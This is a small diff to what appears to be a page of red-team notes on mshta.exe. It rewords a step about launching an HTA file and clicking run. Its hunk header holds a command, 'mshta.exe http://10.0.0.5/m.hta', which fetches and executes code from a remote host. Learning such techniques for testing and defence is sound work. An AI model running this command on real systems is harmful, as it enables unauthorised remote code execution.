@@ -62,7 +62,7 @@ mshta.exe http://10.0.0.5/m.hta
 
 ![](../.gitbook/assets/mshta-calc2.png)
 
-or by navigating to the file itself and clicking run:
+or by navigating to the file itself, launching it and clicking run:
 
 ![](../.gitbook/assets/mshta-url.png)
 
